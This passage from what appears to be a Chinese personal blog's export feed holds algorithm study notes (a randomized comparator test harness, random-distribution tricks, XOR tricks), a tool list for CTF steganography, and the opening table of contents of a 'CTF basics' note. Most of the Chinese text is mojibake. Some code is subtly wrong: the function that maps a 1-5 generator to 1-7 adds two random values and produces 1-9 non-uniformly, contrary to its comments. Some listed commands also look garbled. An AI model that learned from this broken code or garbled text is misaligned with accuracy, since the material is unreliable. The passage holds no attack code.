sort(arr.begin(), arr.end());<br>&#125;<br><br><span class="hljs-comment">// ç”Ÿæˆéšæœºæ•°ç»„</span><br><span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">generateRandomArray</span><span class="hljs-params">(<span class="hljs-type">int</span> maxSize, <span class="hljs-type">int</span> maxValue)</span> &#123;<br>    <span class="hljs-type">int</span> size = rand() % (maxSize + <span class="hljs-number">1</span>);  <span class="hljs-comment">// æ•°ç»„å¤§å°åœ¨ [0, maxSize] ä¹‹é—´</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">arr</span><span class="hljs-params">(size)</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i++) &#123;<br>        arr[i] = rand() % (<span class="hljs-number">2</span> * maxValue + <span class="hljs-number">1</span>) - maxValue;  <span class="hljs-comment">// æ•°å€¼èŒƒå›´ [-maxValue, maxValue]</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> arr;<br>&#125;<br><br><span class="hljs-comment">// å¤åˆ¶æ•°ç»„</span><br><span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">copyArray</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr)</span> &#123;<br>    <span class="hljs-keyword">return</span> arr;  <span class="hljs-comment">// ç›´æ¥è¿”å›å‰¯æœ¬</span><br>&#125;<br><br><span class="hljs-comment">// æ¯”è¾ƒä¸¤ä¸ªæ•°ç»„æ˜¯å¦ç›¸ç­‰</span><br><span class="hljs-type">bool</span> <span class="hljs-title function_">isEqual</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr1, <span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr2)</span> &#123;<br>    <span class="hljs-keyword">if</span> (arr1.size() != arr2.size()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; arr1.size(); i++) &#123;<br>        <span class="hljs-keyword">if</span> (arr1[i] != arr2[i]) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-comment">// æ‰“å°æ•°ç»„</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">printArray</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : arr) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; num &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    srand(time(<span class="hljs-number">0</span>));  <span class="hljs-comment">// è®¾ç½®éšæœºæ•°ç§å­</span><br><br>    <span class="hljs-type">int</span> testTime = <span class="hljs-number">500000</span>;  <span class="hljs-comment">// æµ‹è¯•æ¬¡æ•°</span><br>    <span class="hljs-type">int</span> maxSize = <span class="hljs-number">100</span>;      <span class="hljs-comment">// æ•°ç»„æœ€å¤§é•¿åº¦</span><br>    <span class="hljs-type">int</span> maxValue = <span class="hljs-number">100</span>;     <span class="hljs-comment">// æ•°å€¼èŒƒå›´</span><br>    <span class="hljs-type">bool</span> succeed = <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-comment">// å¤šæ¬¡æµ‹è¯•</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; testTime; i++) &#123;<br>        <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; arr1 = generateRandomArray(maxSize, maxValue);<br>        <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; arr2 = copyArray(arr1);<br><br>        <span class="hljs-comment">// ä½¿ç”¨ä¼˜åŒ–ç®—æ³•æ’åº arr1</span><br>        optimizedAlgorithm(arr1);<br>        <span class="hljs-comment">// ä½¿ç”¨æš´åŠ›ç®—æ³•æ’åº arr2</span><br>        bruteForceAlgorithm(arr2);<br><br>        <span class="hljs-comment">// å¦‚æœæ’åºç»“æœä¸ä¸€è‡´ï¼Œè¾“å‡ºé”™è¯¯ä¿¡æ¯</span><br>        <span class="hljs-keyword">if</span> (!isEqual(arr1, arr2)) &#123;<br>            succeed = <span class="hljs-literal">false</span>;<br>            printArray(arr1);<br>            printArray(arr2);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (succeed) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Nice!&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Fucking fucked!&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// æµ‹è¯•å•ä¸ªæ’åºç»“æœ</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; arr = generateRandomArray(maxSize, maxValue);<br>    printArray(arr);<br>    optimizedAlgorithm(arr);<br>    printArray(arr);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;è¿”å›[0,1)çš„ä¸€ä¸ªå°æ•°</p><p>&#x2F;&#x2F;ä»»æ„çš„x,Ã—å±äº[0,1)ï¼Œ[0ï¼ŒÃ—)èŒƒå›´ä¸Šçš„æ•°å‡ºç°æ¦‚ç‡ç”±åŸæ¥çš„Ã—è°ƒæ•´æˆxå¹³æ–¹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">public <span class="hljs-type">static</span> <span class="hljs-type">double</span> <span class="hljs-title function_">xToXPower2</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> Math.max(Math.random(), Math.random());<br>&#125;<br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;ä¸‰æ¬¡æ–¹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">public <span class="hljs-type">static</span> <span class="hljs-type">double</span> <span class="hljs-title function_">xToXPower3</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> Math.max(Math.random(), Math.max(Math.random(), Math.random()));<br>&#125;<br></code></pre></td></tr></table></figure><p>ä»1<del>5éšæœºåˆ°1</del>7éšæœº</p><p>â€‹ç”±ä¸€ä¸ªf1()æ¡ä»¶å‡½æ•°1-5åˆ°ç›®æ ‡å‡½æ•°f3()1-7</p><p>â€‹ä»¤æœ‰ä¸€ä¸ª01æ¡ä»¶å‘ç”Ÿå™¨f2()ï¼Œè®©12ä¸º0ï¼Œè®©45ä¸º1ï¼Œåˆ°3é‡å¤ï¼Œé‚£ä¹ˆf2_ f2_ f2_è®©æ¯ä¸ªäºŒè¿›åˆ¶ä½ä¸Šé¢å…¨éƒ¨éƒ½æ˜¯f2å°±å¥½äº†ï¼Œå°±æˆä¸ºäº†æ•°å­—çš„0-7,å¯æ˜¯è¦1-7ï¼Œé‚£å°±å½“0-7æ—¶åˆ¤æ–­å½“0æ—¶é‡å¤åšä¸€èˆ¬å°±æˆäº†1-7</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdlib&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctime&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// f2() - ç”Ÿæˆä¸€ä¸ª 0 æˆ– 1</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">f2</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> rand() % <span class="hljs-number">2</span>;  <span class="hljs-comment">// è¿”å› 0 æˆ– 1</span><br>&#125;<br><br><span class="hljs-comment">// f3() - ä½¿ç”¨ f2() ç”Ÿæˆä¸€ä¸ª 0 åˆ° 7 çš„æ•´æ•°</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">f3</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> ans = (f2() &lt;&lt; <span class="hljs-number">2</span>) + (f2() &lt;&lt; <span class="hljs-number">1</span>) + f2();  <span class="hljs-comment">// ç”Ÿæˆä¸€ä¸ªä¸‰ä½çš„äºŒè¿›åˆ¶æ•°</span><br>    <span class="hljs-keyword">return</span> ans;  <span class="hljs-comment">// è¿”å›å€¼æ˜¯ 0 åˆ° 7 ä¹‹é—´</span><br>&#125;<br><br><span class="hljs-comment">// f1() - ç”Ÿæˆä¸€ä¸ª 1 åˆ° 5 ä¹‹é—´çš„éšæœºæ•°</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">f1</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> rand() % <span class="hljs-number">5</span> + <span class="hljs-number">1</span>;  <span class="hljs-comment">// ç”Ÿæˆ 1 åˆ° 5 ä¹‹é—´çš„éšæœºæ•°</span><br>&#125;<br><br><span class="hljs-comment">// å°† f1() æ˜ å°„åˆ° f3() çš„ 1 åˆ° 7</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">mapTo1to7</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> result;<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-type">int</span> f1_result = f1();  <span class="hljs-comment">// 1 åˆ° 5 ä¹‹é—´çš„éšæœºæ•°</span><br>        <span class="hljs-type">int</span> f3_result = f3();  <span class="hljs-comment">// 0 åˆ° 7 ä¹‹é—´çš„éšæœºæ•°</span><br>        <br>        <span class="hljs-comment">// å¦‚æœ f3() ç»“æœåœ¨ 0 åˆ° 4 ä¹‹é—´ï¼Œæ˜ å°„æˆåŠŸ</span><br>        <span class="hljs-keyword">if</span> (f3_result &gt;= <span class="hljs-number">0</span> &amp;&amp; f3_result &lt; <span class="hljs-number">5</span>) &#123;<br>            result = f1_result + f3_result;<br>            <span class="hljs-keyword">return</span> result;  <span class="hljs-comment">// è¿”å› 1 åˆ° 7 ä¹‹é—´çš„éšæœºæ•°</span><br>        &#125;<br>    &#125; <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>);  <span class="hljs-comment">// å¦‚æœ f3() çš„å€¼å¤§äº 4ï¼Œé‡æ–°å°è¯•</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    srand(time(<span class="hljs-number">0</span>));  <span class="hljs-comment">// è®¾ç½®éšæœºæ•°ç§å­</span><br>    <span class="hljs-comment">// æµ‹è¯•</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Random number from 1 to 7: &quot;</span> &lt;&lt; mapTo1to7() &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä»a<del>béšæœºåˆ°c</del>déšæœº </p><p>åŒç†ä½¿ç”¨01æ¡ä»¶å™¨ï¼ŒæŠŠa-båˆ†ç±»ï¼Œc-då˜æˆ0 -  d-c</p><p>åˆ©ç”¨è¿™ä¸ªæ€æƒ³å¤§æ ·æœ¬æ¥è°ƒè¯•ç¨‹åº</p><p>é¦–å…ˆæˆ‘è¡¥ä¸€ä¸ªæ–¹æ³•ã€‚ä½ ç»™æˆ‘ç”³è¯·ä¸€ä¸ªrandomæ•°ç»„ã€‚å‘ƒï¼Œè¿™ä¸ªé•¿åº¦æœ€å¥½éšæœºï¼Œæ‰€ä»¥æœ‰ä¸ªmaxé•¿åº¦ã€‚æˆ‘ç„¶åå€¼å‘¢å€¼æˆ‘ç»™ä½ ä¸ªèŒƒå›´rangeï¼Œè¿™ä¸ªæ˜¯èŒƒå›´æ˜¯å§ï¼Ÿ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdlib&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">randomArray</span><span class="hljs-params">(<span class="hljs-type">int</span> len, <span class="hljs-type">int</span> range, <span class="hljs-type">int</span> k, <span class="hljs-type">int</span> m)</span> &#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">arr</span><span class="hljs-params">(len)</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        arr[i] = rand() % (range + <span class="hljs-number">1</span>); <span class="hljs-comment">// ç”Ÿæˆ 0 ~ range çš„éšæœºæ•°</span><br>        <span class="hljs-keyword">if</span> (arr[i] &lt; k || arr[i] &gt; m) &#123;<br>            arr[i] = rand() % (m - k + <span class="hljs-number">1</span>) + k; <span class="hljs-comment">// ä¿è¯æ•°ç»„å€¼åœ¨ [k, m] èŒƒå›´å†…</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> arr;<br>&#125;<br><br><span class="hljs-comment">// å‡è®¾ test å’Œ onlyKTimes æ˜¯ä¸¤ä¸ªå‡½æ•°ï¼Œä½ éœ€è¦å®ç°å®ƒä»¬</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">test</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr, <span class="hljs-type">int</span> k, <span class="hljs-type">int</span> m)</span> &#123;<br>    <span class="hljs-comment">// å‡è®¾çš„å®ç°ï¼Œå…·ä½“é€»è¾‘æ ¹æ®å®é™…éœ€æ±‚å¡«å†™</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">onlyKTimes</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr, <span class="hljs-type">int</span> k, <span class="hljs-type">int</span> m)</span> &#123;<br>    <span class="hljs-comment">// å‡è®¾çš„å®ç°ï¼Œå…·ä½“é€»è¾‘æ ¹æ®å®é™…éœ€æ±‚å¡«å†™</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> len = <span class="hljs-number">100</span>;  <span class="hljs-comment">//æ•°ç»„é•¿åº¦æœ€å¤§100</span><br>    <span class="hljs-type">int</span> range = <span class="hljs-number">200</span>; <span class="hljs-comment">//æ•°ç»„çš„å€¼åœ¨-200åˆ°200é—´</span><br>    <span class="hljs-type">int</span> testTime = <span class="hljs-number">100000</span>;  <span class="hljs-comment">//éšæœºæ¬¡æ•°</span><br>    <span class="hljs-type">int</span> max = <span class="hljs-number">9</span>;<br><br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;æµ‹è¯•å¼€å§‹&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; testTime; i++) &#123;<br>        <span class="hljs-type">int</span> a = rand() % max + <span class="hljs-number">1</span>; <span class="hljs-comment">// a 1 ~ 9</span><br>        <span class="hljs-type">int</span> b = rand() % max + <span class="hljs-number">1</span>; <span class="hljs-comment">// b 1 ~ 9</span><br>        <span class="hljs-type">int</span> k = min(a, b);<br>        <span class="hljs-type">int</span> m = max(a, b);<br><span class="hljs-comment">//å‘½ä»¤k&lt;m</span><br>        <span class="hljs-keyword">if</span> (k == m) &#123;<br>            m++;<br>        &#125;<br><br>        <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; arr = randomArray(len, range, k, m);<br><br>        <span class="hljs-type">int</span> ans1 = test(arr, k, m);<br>        <span class="hljs-type">int</span> ans2 = onlyKTimes(arr, k, m);<br><br>        <span class="hljs-keyword">if</span> (ans1 != ans2) &#123;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;å‡ºé”™äº†ï¼&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>å¼‚æˆ–</p><p>å¼‚æˆ–è¿ç®—çš„åº”ç”¨</p><p>1.åº”ç”¨ä¸€ï¼šä¸ç”¨ä»»ä½•é¢å¤–å˜é‡äº¤æ¢ä¸¤ä¸ªæ•°ã€‚è¦æ±‚abæ‰€æŒ‡å‘çš„ä½ç½®å¿…é¡»åœ¨ä¸åŒä½ç½® </p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">a</span> = <span class="hljs-keyword">a</span>^b; b = <span class="hljs-keyword">a</span>^b; <span class="hljs-keyword">a</span> = <span class="hljs-keyword">a</span>^b;  <br></code></pre></td></tr></table></figure><p>2.åº”ç”¨äºŒï¼šåœ¨ä¸€ä¸ªæ•°ç»„ä¸­æ‰¾å‡ºç°å¥‡æ•°æ¬¡çš„ä¸€ç§æ•° [a,b,a,a,b]æŠŠæ‰€æœ‰å€¼éƒ½è·Ÿeorå¼‚æˆ–ä¸€ä¸‹ï¼Œæœ€ç»ˆç»“æœæ˜¯å‡ºç°å¥‡æ•°æ¬¡çš„æ•°</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran"><span class="hljs-keyword">eor</span> = <span class="hljs-number">0</span>; <span class="hljs-keyword">eor</span> = <span class="hljs-keyword">eor</span>^a; <span class="hljs-keyword">eor</span> = <span class="hljs-keyword">eor</span>^b; <span class="hljs-keyword">eor</span> = <span class="hljs-keyword">eor</span>^a;  <br></code></pre></td></tr></table></figure><p>3.åº”ç”¨ä¸‰ï¼šäºŒè¿›åˆ¶intå°†æœ€å³ä¾§çš„1æå–å‡ºæ¥ç»„æˆæ–°çš„int</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">a&amp;(-a);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ç®—æ³•</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç®—æ³•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>éšå†™</title>
    <link href="/2024/09/08/%E9%9A%90%E5%86%99/"/>
    <url>/2024/09/08/%E9%9A%90%E5%86%99/</url>
    
    <content type="html"><![CDATA[<h3 id="1-åŸºç¡€æ–‡ä»¶å¤„ç†"><a href="#1-åŸºç¡€æ–‡ä»¶å¤„ç†" class="headerlink" title="1. åŸºç¡€æ–‡ä»¶å¤„ç†"></a>1. åŸºç¡€æ–‡ä»¶å¤„ç†</h3><ul><li><strong>æ–‡ä»¶æ‰“åŒ…ä¸æ··æ·†ï¼š</strong><ul><li>åˆ©ç”¨<code>polyglots</code>æŠ€å·§è¿›è¡Œå¤šæ–‡ä»¶æ··åˆï¼ˆå¦‚ï¼šå›¾ç‰‡ä¸å…¶ä»–æ–‡ä»¶æ··åˆï¼‰ã€‚</li><li><code>base</code>æ“ä½œï¼Œç”¨äºè¿›è¡Œç¼–ç ã€è§£ç ã€‚</li><li>å·¥å…·ï¼š<code>CyberChef</code>ã€<code>Cryptool</code>ã€<code>Hiencode</code>ç­‰ã€‚</li></ul></li><li><strong>éšå†™å·¥å…·åŠéšå†™ä¿¡æ¯æå–ï¼š</strong><ul><li>ä½¿ç”¨<code>word</code>è¿›è¡Œéšå†™ã€‚</li><li>å¸¸ç”¨å‘½ä»¤ï¼š<ul><li><code>ls</code>ç”¨äºåˆ—å‡ºéšè—å†…å®¹ã€‚</li><li><code>php-sup -win -r</code>ç›¸å…³å‘½ä»¤ç”¨äºåˆ†æå’Œå¤„ç†éšå†™ä¿¡æ¯ã€‚</li></ul></li><li>å…¶ä»–å·¥å…·ï¼š<code>stegsolve</code>ã€<code>pngcheck</code>ã€<code>exiftool</code>ã€<code>snow</code>ï¼ˆé›ªéšå†™å·¥å…·ï¼‰ã€‚</li></ul></li></ul><hr><h3 id="2-éšå†™æœ¯å·¥å…·åŠæŠ€æœ¯"><a href="#2-éšå†™æœ¯å·¥å…·åŠæŠ€æœ¯" class="headerlink" title="2. éšå†™æœ¯å·¥å…·åŠæŠ€æœ¯"></a>2. éšå†™æœ¯å·¥å…·åŠæŠ€æœ¯</h3><ul><li><strong>å›¾ç‰‡éšå†™å¤„ç†ï¼š</strong><ul><li>ä½¿ç”¨<code>pngcheck</code>åˆ†æPNGæ ¼å¼å›¾åƒã€‚</li><li>äº†è§£æ–‡ä»¶æ ¼å¼ç»“æ„ï¼Œæ–‡ä»¶å¤´ï¼ˆIDATï¼‰ç­‰ã€‚</li><li>éšå†™ä¿¡æ¯æå–å·¥å…·ï¼š<code>stegsolve</code>ã€<code>stegdetect</code>ã€‚</li></ul></li><li><strong>éŸ³é¢‘éšå†™å¤„ç†ï¼š</strong><ul><li>ä½¿ç”¨<code>audacity</code>å·¥å…·åˆ†æéŸ³é¢‘æ–‡ä»¶ä¸­çš„éšå†™ä¿¡æ¯ã€‚</li><li>æ”¯æŒçš„æ–‡ä»¶æ ¼å¼ï¼š<code>mp3</code>ã€<code>wav</code>ã€<code>mp4</code>ç­‰ã€‚</li></ul></li><li><strong>è§†é¢‘åŠå…¶ä»–æ ¼å¼éšå†™å¤„ç†ï¼š</strong><ul><li>ä½¿ç”¨<code>imagemagick</code>å¤„ç†GIFç­‰æ ¼å¼æ–‡ä»¶ã€‚</li><li>å‘½ä»¤ï¼š<code>sudo imagemagick</code>ç”¨äºåˆ†æå›¾åƒåŠGIFã€‚</li></ul></li></ul><hr><h3 id="3-éšå†™æ£€æµ‹åŠåˆ†æå·¥å…·"><a href="#3-éšå†™æ£€æµ‹åŠåˆ†æå·¥å…·" class="headerlink" title="3. éšå†™æ£€æµ‹åŠåˆ†æå·¥å…·"></a>3. éšå†™æ£€æµ‹åŠåˆ†æå·¥å…·</h3><ul><li><strong>å¸¸è§éšå†™æ£€æµ‹å·¥å…·ï¼š</strong><ul><li><code>pngcheck</code>ç”¨äºPNGæ ¼å¼çš„éšå†™æ£€æµ‹ã€‚</li><li><code>stegdetect</code>ç”¨äºJPGéšå†™çš„æ£€æµ‹ã€‚</li></ul></li><li><strong>å…¶ä»–é«˜çº§éšå†™åˆ†æå·¥å…·ï¼š</strong><ul><li><code>blindwatermark</code>ï¼ˆç›²æ°´å°åˆ†æå·¥å…·ï¼‰ã€‚</li><li><code>stegano</code>ç³»åˆ—å·¥å…·ï¼Œå¦‚<code>xiasteganography</code>ã€‚</li></ul></li></ul><hr><h3 id="4-é«˜çº§éšå†™æŠ€æœ¯åŠå…¶ä»–ç›¸å…³å·¥å…·"><a href="#4-é«˜çº§éšå†™æŠ€æœ¯åŠå…¶ä»–ç›¸å…³å·¥å…·" class="headerlink" title="4. é«˜çº§éšå†™æŠ€æœ¯åŠå…¶ä»–ç›¸å…³å·¥å…·"></a>4. é«˜çº§éšå†™æŠ€æœ¯åŠå…¶ä»–ç›¸å…³å·¥å…·</h3><ul><li><strong>å¤šç§éšå†™å·¥å…·å¯¹æ¯”åŠæµ‹è¯•ï¼š</strong><ul><li>å¯¹æ¯”ä¸åŒéšå†™å·¥å…·çš„ä¼˜åŠ£ï¼Œå¦‚ï¼š<code>bmfontpy3</code>ã€<code>blindwatermark</code>ç­‰ã€‚</li><li><code>cover</code>å’Œ<code>coalesce</code>ç­‰å‘½ä»¤ç”¨äºåˆ†æéŸ³é¢‘ã€è§†é¢‘çš„éšå†™ä¿¡æ¯ã€‚</li></ul></li><li><strong>å¸¸ç”¨éšå†™æœ¯çš„å‘½ä»¤åŠå·¥å…·ï¼š</strong><ul><li><code>mp3info</code>ã€<code>ffmpeg</code>ã€<code>snow</code>ç­‰å·¥å…·ã€‚</li></ul></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ctfåŸºç¡€ç¬”è®°</title>
    <link href="/2024/09/05/ctf%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/09/05/ctf%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p><strong>CTF</strong> <strong>æˆå‘˜åŸºç¡€è¯­æ³•ç¬”è®°</strong></p><p><strong>ç›®å½•</strong></p><ol><li><strong>Python</strong> <strong>åŸºç¡€</strong></li><li><strong>JavaScript</strong> <strong>åŸºç¡€</strong></li><li><strong>PHP</strong> <strong>æ¡†æ¶ - ThinkPHP</strong></li><li></li></ol><h1 id="1-Python-åŸºç¡€"><a href="#1-Python-åŸºç¡€" class="headerlink" title="1. Python åŸºç¡€"></a><strong>1. Python</strong> <strong>åŸºç¡€</strong></h1><hr><h1 id="ç›®å½•"><a href="#ç›®å½•" class="headerlink" title="ç›®å½•"></a>ç›®å½•</h1><ul><li><p><a href="#1-python%E5%9F%BA%E7%A1%80">1. PythonåŸºç¡€</a></p><ul><li><a href="#11-python%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95">1.1 PythonåŸºæœ¬è¯­æ³•</a></li><li><a href="#12-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">1.2 æ•°æ®ç±»å‹</a></li><li><a 